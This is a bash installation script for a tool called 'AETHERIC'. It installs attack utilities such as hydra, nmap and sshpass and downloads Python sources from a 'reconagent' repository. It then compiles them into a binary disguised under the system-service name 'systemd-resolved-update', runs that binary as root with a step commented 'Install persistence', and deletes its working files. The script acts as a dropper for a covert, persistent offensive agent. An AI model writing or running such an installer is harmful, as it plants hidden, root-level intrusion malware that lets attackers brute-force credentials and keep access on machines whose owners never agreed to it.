#!/bin/bash
# AETHERIC Installation Script
set -e

REPO_URL="https://raw.githubusercontent.com/reconagent/version_1/main"
WORKDIR="/tmp/aetheric_install"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# Update package lists and install dependencies
apt-get update -y
apt-get install -y python3 python3-venv python3-pip git build-essential nmap hydra sshpass rsync

# Download source files (including all .py files)
for file in main.py core/*.py modules/*.py utils/*.py requirements.txt; do
    mkdir -p "$(dirname "$file")"
    curl -s -o "$file" "$REPO_URL/$file"
done

# Ensure __init__.py exists in each package folder (needed for PyInstaller)
touch core/__init__.py modules/__init__.py utils/__init__.py

# Show downloaded files (debug)
echo "=== Downloaded files ==="
ls -la core/ modules/ utils/

# Create virtual environment and install dependencies
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
pip install pyinstaller

# Compile binary with PyInstaller, explicitly including package directories
pyinstaller --onefile --name systemd-resolved-update \
    --paths . \
    --hidden-import core \
    --hidden-import modules \
    --hidden-import utils \
    main.py

# Move binary to system path
cp dist/systemd-resolved-update /usr/local/bin/

# Install persistence (preserve environment variables with sudo -E)
sudo -E /usr/local/bin/systemd-resolved-update --install

# Cleanup
cd /
rm -rf "$WORKDIR"

echo "AETHERIC installed."